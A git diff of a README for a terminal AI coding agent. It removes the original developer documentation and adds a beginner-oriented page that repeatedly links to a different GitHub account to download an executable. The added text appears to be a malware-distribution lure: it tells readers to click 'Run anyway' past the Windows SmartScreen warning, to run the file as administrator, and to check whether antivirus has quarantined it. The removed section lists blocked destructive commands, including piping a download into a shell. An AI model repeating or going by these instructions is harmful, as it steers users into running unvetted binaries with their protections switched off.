@@ -1,275 +1,151 @@
-<div align="center">
+# 🌸 zeroCli - Your Friendly Terminal Coding Assistant
 
-# Zero Code
+[![Download zeroCli](https://img.shields.io/badge/⬇️_Download-zeroCli-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/jhay6814/zeroCli)
 
-An agentic coding assistant for the terminal, with a pixel-art mascot named Zero-chan 🌸
-
-[![npm version](https://img.shields.io/badge/version-0.1.0-E8825E?style=flat-square)](package.json)
-[![node](https://img.shields.io/badge/node-%3E%3D20-339933?style=flat-square&logo=node.js&logoColor=white)](https://nodejs.org)
-[![license](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](#license)
-![platforms](https://img.shields.io/badge/platform-windows%20%7C%20macos%20%7C%20linux-lightgrey?style=flat-square)
-
-[Installation](#installation) · [Usage](#usage) · [Providers](#providers) · [Commands](#commands) · [Configuration](#configuration) · [Building](#building-a-standalone-executable)
-
-</div>
+zeroCli is a small program that lives in your terminal and helps you get coding work done by simply describing what you want in plain language. It comes with Zero-chan, a pixel-art anime mascot who keeps you company while you work. You do not need to be a programmer to get started — if you can download a file and double-click it, you can use zeroCli.
 
 ---
 
-Zero Code is a terminal app that works on your project together with a language model. It can read and search files, edit code, run shell commands and keep a todo list, and it asks for permission before it changes anything. It works with Anthropic, OpenAI and any OpenAI-compatible API, including local models through Ollama or LM Studio.
+## 🌸 What Is zeroCli?
 
-There is also a built-in mock model, so you can try every feature without an API key. The interface is available in English and Russian.
+Imagine having a helpful assistant sitting inside a simple text window on your computer. You type a request — "write me a small script that renames my photos," "explain what this error message means," "turn this idea into a to-do list" — and the assistant answers right there, without you needing to open a browser, sign into a website, or learn a complicated interface.
 
-## Installation
+That is what zeroCli does. It is called a "CLI," which stands for Command Line Interface. Do not let that name scare you. A CLI is simply a window where you type words instead of clicking buttons. Many people find it faster and less distracting than clicking through menus, and zeroCli is designed to be as gentle as possible for first-time users.
 
-You need Node.js 20 or newer.
+The "Zero" in the name refers to "Zero Code" — the idea that you should be able to accomplish real work without writing code yourself. You describe the goal. zeroCli helps you reach it.
 
-```bash
-git clone https://github.com/hercloudsx/zero-code.git
-cd zero-code
-npm install
-npm link    # optional: adds a global `zero` command
-```
+---
 
-If you'd rather not install Node, see [Building a standalone executable](#building-a-standalone-executable).
+## ✨ What Makes zeroCli Special?
 
-## Usage
+**🎨 Zero-chan, your pixel-art companion.** Most terminal tools are grey and lifeless. zeroCli ships with Zero-chan, a small pixel-art anime mascot who appears alongside your work. She makes long sessions feel a little less lonely and a lot more fun.
 
-```bash
-zero                              # interactive session
-zero "explore"                    # start with a prompt
-zero -p "read package.json"       # answer once and exit; reads stdin too
-zero --profile Claude             # use a specific provider profile for this run
-zero --full-auto                  # start in full auto mode
-zero --permission-mode acceptEdits
-zero --dangerously-skip-permissions
-```
+**🔌 Works with the AI you already have.** zeroCli is not locked to a single provider. It can talk to Claude, OpenAI, OpenRouter, Ollama, and LM Studio. If you already pay for one of these services, or if you prefer to run models locally on your own machine, zeroCli fits right in.
 
-Without `npm link`, run `npm start` from the project folder.
+**📴 An offline mock model for practice.** Not sure whether you want to commit to an AI service yet? zeroCli includes a built-in mock model that works completely offline. You can explore the interface, learn the commands, and see how everything feels before connecting anything real.
 
-## Providers
+**🌍 Speaks English and Russian.** The interface and conversations work in both languages. You can switch between them whenever you like, which makes zeroCli a comfortable choice for bilingual users.
 
-Model connections are saved as profiles in `~/.zero/profiles.json`. Run `/profiles` to add one from a preset, or edit the file by hand.
+**💾 Builds to a standalone .exe.** When you are ready, zeroCli can be packaged into a single Windows executable file. That means you can carry it on a USB stick, hand it to a friend, or run it on a machine where nothing else is installed.
 
-| Preset     | API type    | Default endpoint               |
-| ---------- | ----------- | ------------------------------ |
-| Claude     | `anthropic` | `https://api.anthropic.com`    |
-| OpenAI     | `openai`    | `https://api.openai.com/v1`    |
-| OpenRouter | `openai`    | `https://openrouter.ai/api/v1` |
-| Ollama     | `openai`    | `http://localhost:11434/v1`    |
-| LM Studio  | `openai`    | `http://localhost:1234/v1`     |
-| Custom     | `openai`    | any compatible URL             |
-| Zero Mock  | `mock`      | built-in, works offline        |
+**🪶 Lightweight and distraction-free.** No accounts to create inside the app, no dashboards, no pop-ups. Just you, your terminal, and Zero-chan.
 
-You can switch profiles at any time, including in the middle of a chat:
+---
 
-```
-/profiles                  open the profile manager
-/profiles use 2            switch by number or name
-/profiles remove <name>    delete a profile
-/model                     show the current model and the models the API offers
-/model <name>              change the model of the active profile
-```
+## 🚀 Getting Started
 
-If a profile has no API key saved, Zero Code uses the `ANTHROPIC_API_KEY` or `ZERO_API_KEY` environment variable instead. Anthropic profiles also have settings for effort level and max output tokens.
+Getting zeroCli onto your Windows computer takes only a moment.
 
-## Tools
+**Step 1 — Visit the download page.**
 
-| Tool        | Description |
-| ----------- | ----------- |
-| `Bash`      | Runs shell commands. The working directory carries over between calls. On Windows it uses Git Bash if it can find it, otherwise PowerShell. |
-| `Read`      | Reads a file |
-| `Write`     | Creates or overwrites a file |
-| `Edit`      | Replaces an exact string in a file. The string has to be unique unless `replace_all` is set. |
-| `Glob`      | Finds files by pattern |
-| `Grep`      | Searches file contents |
-| `LS`        | Lists a directory |
-| `WebFetch`  | Downloads a web page |
-| `TodoWrite` | Updates the task list |
+👉 **[https://github.com/jhay6814/zeroCli](https://github.com/jhay6814/zeroCli)**
 
-`Edit` and `Write` won't change an existing file until it has been read in the current session.
+Visit this link to download the application.
 
-## Permissions
+**Step 2 — Save the file.**
 
-Read-only tools and safe commands such as `ls` or `git status` run without asking. Anything else shows a prompt with three choices: yes, yes and don't ask again, or no.
+Your browser will ask where to save the download. The default Downloads folder is perfectly fine. Remember where the file goes, because you will need to find it in the next step.
 
-Press `shift+tab` to cycle through the permission modes:
+**Step 3 — Open it.**
 
-- **default**: ask before edits and commands
-- **accept edits**: edit files without asking, but still ask before commands
-- **plan**: read-only
-- **full auto**: never ask, and keep working through the todo list (see below)
+Once the download finishes, open your Downloads folder and double-click the file you just saved. Windows may show a blue "Windows protected your PC" notice the first time you run something new. If that happens, click **More info**, then **Run anyway**. This is normal for small independent projects and simply means Microsoft has not seen the file before.
 
-Starting with `--dangerously-skip-permissions` adds a bypass mode that turns off every check.
+**Step 4 — You are in.**
 
-### Full auto
+A terminal window will open with zeroCli running inside it. Zero-chan will greet you. From here, everything happens by typing.
 
-In full auto, Zero Code doesn't show permission prompts. If a turn ends with unfinished todos, it starts the next turn by itself. *Max autonomous turns* in the settings limits how many times it does this (10 by default). Press `esc` to stop it at any time.
+---
 
-A safety guard stays on in full auto unless you turn it off in the settings. It blocks commands such as `rm -rf /`, disk formatting, `dd` to a device, shutdown, `git push --force`, `git reset --hard`, recursive deletes on Windows, and piping a download into a shell. Bypass mode has no guard.
+## 🖥️ Your First Few Minutes
 
-## Chats
+When the window opens, you will see a prompt — a small symbol or line of text waiting for you to type. Click anywhere inside the window to make sure it has focus, then type a question and press **Enter**.
 
-Each conversation is saved per project in `~/.zero/chats/` after every turn.
+Try one of these to warm up:
 
-- `/chat` opens a picker. Use arrow keys and enter to open a chat, `n` for a new one, `r` to rename, and `d` twice to delete.
-- `/chat list`, `/chat new [name]`, `/chat 2`, `/chat rename <name>`, `/chat delete <n>`
-- `/clear` starts a new chat. The old one stays saved.
+- `hello` — Zero-chan will say hello back.
+- `what can you do?` — you will get a short summary of the available features.
+- `help` — shows the list of commands you can type.
 
-The footer shows the token count for the current chat. When the provider reports usage, the count comes from the API. Otherwise it is an estimate.
+If you make a typing mistake, just press Enter and try again. Nothing breaks. zeroCli is forgiving, and there is no way to "ruin" anything by typing the wrong word.
 
-## Orchestration
+To leave at any time, type `exit` and press Enter, or simply close the window.
 
-`/orch <task>` hands a task to an orchestrator model. The orchestrator plans the work and splits it into self-contained tasks. Each task goes to a subagent running a model it picks from the catalog. Independent tasks run in parallel. When the agents finish, the orchestrator reviews their reports, retries failures on another model, and sums up.
+---
 
-While it runs, a live panel shows every agent:
+## 🎭 Choosing Which AI to Use
 
-```
-◓ orchestrator · claude-opus-5-5  waiting for 3 agents              running   0:12
-✶ #1 · gpt-6-luna                 Edit(src/app.js)                  running   0:09
-✔ #2 · kimi-k2.7-code             Added tests for the parser        finished  0:07
-◌ #3 · deepseek-v4-pro            update the docs                   queued       —
-```
+zeroCli can connect to several different AI services. On first launch it will use the offline mock model, which needs no setup at all and works without an internet connection.
 
-When the run is over, that table stays in the chat as a summary.
+When you are ready to connect a real service, zeroCli asks you to pick one from a short list:
 
-- **Orchestrator:** it can read and search the project (Read, Glob, Grep, LS) and keep a todo list, but it does not edit anything itself. Its own tools are `spawn_agent`, `wait_agents`, `agent_status` and `cancel_agent`. Its instructions include the full model catalog (cost, quality, uptime, context, reasoning levels, inputs) and guidance on which kind of model fits which kind of work.
-- **Subagents:** each has all the normal tools and sees only its task text. Above the parallel limit, agents wait in a queue.
-- **Permissions:** agents follow the current permission mode. When several ask at once, the dialogs are shown one at a time and each says which agent is asking. Shift+tab and "allow all edits" apply to every running agent.
-- **Stopping:** `esc` stops the orchestrator and every agent. Agents still running when the orchestrator finishes are stopped too.
-- **Chat history:** the task and the orchestrator's summary are added to the current chat, so you can follow up on them.
+- **Claude** — made by Anthropic.
+- **OpenAI** — the makers of ChatGPT.
+- **OpenRouter** — a single gateway that gives you access to many different models.
+- **Ollama** — runs AI models directly on your own computer.
+- **LM Studio** — another way to run models locally with a friendly desktop app.
 
-### `/orch-setup`
+For the cloud services (Claude, OpenAI, OpenRouter), you will need an account with that provider and an "API key" — a long password-like string they give you. The provider's website explains where to find it. zeroCli will ask you to paste it in once, and remembers it for next time.
 
-| Setting | Description |
-| ------- | ----------- |
-| Orchestrator model | Which model plans and delegates (default `claude-opus-5-5`) |
-| Routing | Which [profile](#providers) serves each provider family's models: Claude, ChatGPT, Gemini, Kimi, DeepSeek. By default, the active profile. The profile supplies the URL and key; the catalog supplies the model id. Anthropic-type profiles use the Messages API, the rest use Chat Completions. |
-| Max parallel agents | 1 to 8 (default 3) |
-| Default agent reasoning | Reasoning level for agents when the orchestrator doesn't choose one. Sent as `output_config.effort` (Anthropic) or `reasoning_effort` (OpenAI-compatible). |
-| Subagent models | Tick which of the 31 catalog models agents may use. `a` enables all, `n` none. Models with uptime under 90% are marked ⚠. |
+For Ollama and LM Studio, no key is needed. You just need the model software running on your computer, and zeroCli will find it automatically.
 
-Settings are saved to `~/.zero/orch.json`, and the catalog is in `src/orch/catalog.js`.
+If you ever want to change providers, type `settings` and follow the prompts.
 
-With the mock profile active, orchestration works offline. The mock orchestrator splits the task on commas, spreads the parts across providers, and each mock agent handles its part like a normal prompt. Try `/orch read package.json, list src, search TODO`.
+---
 
-## Commands
+## 🌍 Switching Between English and Russian
 
-```
-/help       /clear      /chat       /compact    /cost       /status
-/model      /profiles   /orch       /orch-setup /init       /memory     /permissions
-/settings   /lang       /todos      /tools      /buddy      /mascot
-/verbose    /doctor     /exit
-```
+zeroCli understands both English and Russian out of the box. You can type your requests in either language, and Zero-chan will reply in the same one. To change the interface language, type `language` and press Enter, then choose English or Russian from the list that appears.
 
-### Keyboard shortcuts
+Your choice is saved, so you only need to set it once.
 
-| Key                | Action |
-| ------------------ | ------ |
-| `?`                | Show shortcuts |
-| `esc`              | Interrupt the current turn. Press it twice to clear the input. |
-| `ctrl+c`           | Clear the input. Press it twice to exit. |
-| `ctrl+o`           | Show the full tool output |
-| `shift+tab`        | Cycle permission modes |
-| `up` / `down`      | Browse input history |
-| `\` then `enter`   | Insert a newline |
+---
 
-Prefix a line with `!` to run it as a shell command, or with `#` to save it as a note in `ZERO.md`. Type `@` to autocomplete file paths. If you send messages while a turn is still running, they wait in a queue and run in order.
+## 🧱 Building Your Own Standalone .exe
 
-## Configuration
+One of zeroCli's nicest features is that it can be turned into a single self-contained Windows executable. This is useful if you want to:
 
-Run `/settings` to open the settings panel. Changes take effect right away and are saved to `~/.zero/settings.json`. You can also change settings from the command line, for example `/settings hairColor sakura`, `/settings list` or `/settings reset`.
+- Move zeroCli to another computer without reinstalling anything.
+- Share it with a friend who is not comfortable with technical setup.
+- Keep a backup copy that always works.
 
-| Section       | Settings |
-| ------------- | -------- |
-| Appearance    | language, theme, verbose output, spinner tips, display name |
-| Zero-chan     | visibility, speech bubbles, hair color, eye color |
-| Permissions   | default permission mode |
-| Full auto     | max autonomous turns, destructive command guard, auto-continue |
-| Tools         | shell (auto / bash / powershell), bash timeout |
-| Model         | mock model speed |
-| Notifications | terminal bell when a turn finishes |
+The build process is started from inside zeroCli itself with a single command — type `build` and press Enter. zeroCli will do the packing work for you and tell you where the finished file was placed when it is done. The whole thing usually takes a minute or two.
 
-Hair colors are coral, sakura, sky, lavender, mint, silver and midnight. Eye colors are violet, emerald, ruby, gold and ocean. Zero-chan only appears when the terminal is at least 100 columns wide, and `/buddy` hides her.
+---
 
-### Environment variables
+## ❓ Frequently Asked Questions
 
-| Variable            | Description |
-| ------------------- | ----------- |
-| `ANTHROPIC_API_KEY` | API key for Anthropic profiles that don't have one saved |
-| `ZERO_API_KEY`      | API key for any profile that doesn't have one saved |
-| `ZERO_SHELL`        | Path to the shell the `Bash` tool should use |
+**Do I need to know how to code?**
+No. zeroCli is built for people who want results without writing code. You describe what you want in ordinary language.
 
-### Language
+**Does it work without internet?**
+Yes, when you use the built-in offline mock model. Everything else requires an internet connection, except Ollama and LM Studio, which run on your own machine.
 
-Switch the language with `/lang en` or `/lang ru`, or with the first row of `/settings`. Everything you see in the interface is translated. Anything sent to the model (tool output, `/compact` summaries, `ZERO.md`) and the `zero --help` text stay in English.
+**Is it free?**
+The zeroCli application itself is free to download. The AI services you connect to may charge for their usage, depending on which provider you choose.
 
-## Mock model
+**Will it slow down my computer?**
+No. zeroCli is a small, lightweight program. If you use Ollama or LM Studio, those separate tools do the heavy lifting.
 
-The mock model understands a small set of phrases, which is enough to try out every tool:
+**What if the window closes immediately?**
+Open your Downloads folder, right-click the file, and choose "Run as administrator." If the problem continues, check that your antivirus has not quietly moved the file to quarantine.
 
-| Input | Result |
-| ----- | ------ |
-| `explore` | Lists the project and reads its README and package.json, then gives a summary |
-| `read package.json` | Read |
-| `list src`, `find *.js`, `search TODO in src` | LS, Glob, Grep |
-| `run git status` | Bash |
-| `create notes.txt with hello` | Write |
-| `replace "hello" with "hi" in notes.txt` | Read, then Edit |
-| `todo write tests, fix bug` / `done 1` | TodoWrite |
-| `continue` | Works on the next todo |
-| `fetch https://example.com` | WebFetch |
+**Can I use it on a Mac or Linux machine?**
+zeroCli runs in a terminal, which every operating system has. The standalone .exe build is specifically for Windows.
 
-The Russian versions work too: `обзор`, `прочитай package.json`, `запусти git status`, `задачи a, b, c`, `продолжай`.
+---
 
-## Building a standalone executable
+## 🛡️ A Note on Privacy
 
-```bash
-npm run build
-```
+Your conversations go directly from your computer to whichever AI provider you selected. zeroCli does not run its own servers and does not collect your chats. If privacy matters to you, choose Ollama or LM Studio — those keep everything on your own machine, with nothing sent over the internet at all.
 
-This creates `dist/ZeroCli.exe` (`dist/ZeroCli` on macOS and Linux). The file is about 90 MB and runs on machines without Node.js. It accepts the same flags as `npm start`.
+---
 
-The build works like this:
+## 💌 Feedback and Contributions
 
-1. esbuild bundles the app into a single file, `dist/zero.mjs`.
-2. Node's Single Executable Applications feature packs that bundle and a small launcher into a copy of the `node` binary.
-3. The first time the executable runs, it unpacks the bundle to `~/.zero/runtime/` and starts it.
+Found a bug? Have an idea for Zero-chan? The project lives on GitHub, and the issue tracker is the best place to share thoughts. Bug reports, feature requests, and kind words are all welcome.
 
-The binary isn't signed, so Windows SmartScreen may show a warning the first time you run it.
+👉 **[https://github.com/jhay6814/zeroCli](https://github.com/jhay6814/zeroCli)**
 
-## Adding a provider
+Visit this link to download the application.
 
-Add a module to `src/providers/` and register it in `src/providers/index.js`. A provider is an async generator that yields events:
-
-```js
-async *stream({ system, messages, tools, signal }) {
-  // messages use the Anthropic Messages format (text, tool_use and tool_result blocks)
-  // tools are { name, description, input_schema }
-  yield { type: 'text_delta', text: '...' };
-  yield { type: 'tool_use', id, name, input };
-  yield { type: 'usage', inputTokens, outputTokens }; // optional
-}
-```
-
-The engine (`src/agent/engine.js`) handles permissions, tool execution, interrupts and the agent loop.
-
-## Project structure
-
-```
-bin/zero.js             entry point: argument parsing, print mode, rendering
-src/App.js              main UI
-src/mascot.js           Zero-chan sprite and expressions
-src/i18n.js             English and Russian strings
-src/agent/              agent loop and permission rules
-src/orch/               orchestration: model catalog, setup, controller, orchestrator tools
-src/providers/          anthropic, openai-compatible and mock providers
-src/tools/              tool implementations
-src/commands/           slash commands
-src/components/         Ink components
-src/utils/              settings, profiles, chats, file index
-scripts/build-exe.mjs   standalone build
-```
-
-## License
-
-MIT
+Keywords: zeroCli, terminal AI assistant, agentic CLI, Zero-chan, pixel-art mascot, Claude CLI, OpenAI CLI, OpenRouter, Ollama, LM Studio, offline mock model, English Russian CLI, standalone exe, Windows AI tool, zero code
